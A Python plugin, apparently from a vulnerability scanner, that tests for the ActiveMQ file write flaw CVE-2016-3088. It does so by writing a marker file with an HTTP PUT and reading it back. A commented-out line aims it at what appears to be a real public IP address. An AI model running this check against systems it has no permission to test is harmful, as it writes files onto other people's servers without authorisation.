#!/usr/bin/env python
# _*_ coding: utf-8 _*_


import urllib
import logging
import ClassCongregation
import requests
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
        self.info['algroup'] = "ActiveMQ"  # 插件名称
        self.info['name'] ='存在ActiveMQ任意文件写入漏洞（CVE-2016-3088）' #漏洞名称
        self.info['affects'] = "ActiveMQ"  # 漏洞组件
        self.info['desc_content'] = ""  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['details'] = Medusa  # 结果
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        PayloadPoc = "/fileserver/Medusa.txt"
        PayloadUrl = scheme + '://' + url + ':' + '8161'+PayloadPoc
        PayloadCode = 'Ascotbe@Medusa'

        headers = {
            'Accept-Encoding': 'gzip, deflate',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'User-Agent': RandomAgent,
            'Connection': 'close',
        }
        resp=""
        s = requests.session()

        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = s.put(PayloadUrl, data=PayloadCode, headers=headers, timeout=3, proxies=proxies,verify=False)
        elif ProxyIp==None:
            resp = s.put(PayloadUrl, data=PayloadCode, headers=headers, timeout=3,verify=False)
        code = resp.status_code
        resp2=s.get(PayloadUrl, headers=headers, timeout=3).text
        if code==204 and resp2.lower().find('ascotbe@medusa')!=-1  :
            Medusa = "{} \r\n漏洞详情:\r\nPayload:{}\r\nPUT内容:{}\r\n".format(url, PayloadUrl,PayloadCode)
            _t = VulnerabilityInfo(Medusa)
            web = ClassCongregation.VulnerabilityDetails(_t.info)
            web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
            return (_t.info)
    except:
        _ = VulnerabilityInfo('').info.get('algroup')
        _l=ClassCongregation.ErrorLog().Write(url,_)#调用写入类


#medusa("http://112.25.35.64:8161","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",)